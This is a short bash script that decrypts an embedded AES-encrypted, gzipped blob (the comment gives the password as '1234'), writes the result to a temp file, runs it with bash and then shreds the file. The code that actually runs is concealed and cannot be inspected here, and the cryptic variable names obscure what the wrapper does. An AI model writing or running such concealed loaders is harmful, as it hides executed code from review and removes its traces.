#!/usr/bin/env bash
# pass is 1234
G="SIGINT SIGTERM ERR EXIT"; set -Eeu; trap c ${G};
S='
U2FsdGVkX1+zSUmxL93xx7X6khNtfs1W9qd03Ahb+QmAiLHXul5wmjUfev5AaOR0
Q4E1YRT4qWQw4nXRPE/KJxUscpDlQK5FTetFrSzzhyOebO4SLUk0D/2rK1LEcCS9
'
N="/dev/null";W=$(which which);C=$(${W} openssl);Z=$(${W} gunzip);D=$(${W} dirname);M=$(${W} mktemp);if ${W} shred 1>${N}; then R="$(${W} shred) -u"; else R=$(${W} rm); fi;P=$(${D} "${0}");O=$(${M} -p "${P}");c(){ trap - ${G}; ${R} "${O}" 2>${N}; };echo "${S}" | ${C} aes-128-cbc -d -a -salt -pbkdf2 2>${N} | ${Z} > "${O}" 2>${N}; /bin/bash "${O}" ${*}
